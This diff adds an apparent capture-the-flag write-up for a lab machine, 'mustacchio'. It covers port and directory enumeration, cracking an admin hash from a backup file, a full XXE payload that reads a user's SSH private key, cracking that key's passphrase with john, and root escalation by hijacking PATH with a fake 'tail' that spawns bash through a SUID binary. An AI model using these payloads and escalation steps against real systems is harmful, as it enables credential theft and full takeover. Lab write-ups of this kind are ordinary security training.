@@ -1,0 +1,61 @@
+10.10.18.211
+nmap all port scan 
+22:ssh
+80: webserver
+8765: login page
+
+gobuster found a few directories withn the site including /custom 
+inspecting the /custom/js/ found user.bak a backupsql file
+browse the user.bak using sqlitebrowser and found credentials and a hash
+admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
+
+cracked the hash for credentials
+admin : bulldog19
+
+the site asks for a xml input while intersepting the request and checking the dontforget.bak file reveals that the site is vulnerable to xxe
+
+tried this code to grab the ssh private key of barry from the give comment box 
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
+<comment>
+  <name>&ent;</name>
+  <author>Barry Clad</author>
+  <com>Hiiii</com>
+</comment>
+
+the ssh private key is encrypted hence it needs to be cracked using john
+for that the id_rsa file has to be first converted using ssh2john which is located at /usr/share/john/ssh2john 
+and finally using the john on the converted file gives the cracked hash password 
+
+barry : urieljames
+ssh into the machine with this credentials 
+grab the user flag 
+
+##################################################
+privesc
+1) checking the SUID bit
+	/home/joe/live_log
+
+2) checking the suid bit with strings will give the following file 
+	tail -f /var/log/nginx/access.log
+	tail is helping to display the log file
+
+3) go to /tmp and make a fake tail file
+	add content :-
+
+	#!/bin/bash
+	/bin/bash
+
+4) save it as tail
+
+5) set the path for the tail file
+	barry@mustacchio:/tmp$ chmod 777 tail
+	barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
+	barry@mustacchio:/tmp$ which tail
+	/tmp/tail
+
+6) now run the /home/joe/live_log to get root
+	the /tmp/tail act as the tail command and runs our code (/bin/bash) as root 
+7) grab the root flag from /root/root.txt
+###################################################
